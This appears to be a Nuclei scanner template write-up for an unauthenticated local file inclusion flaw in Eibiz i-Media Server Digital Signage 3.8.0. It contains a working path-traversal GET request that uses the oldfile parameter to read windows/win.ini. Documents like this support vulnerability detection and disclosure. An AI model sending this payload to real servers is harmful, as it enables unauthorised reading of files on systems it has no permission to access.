# Nuclei Template: Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion
**Template ID:** eibiz-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`eibiz-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null
```

## References
- https://packetstormsecurity.com/files/158943/Eibiz-i-Media-Server-Digital-Signage-3.8.0-File-Path-Traversal.html
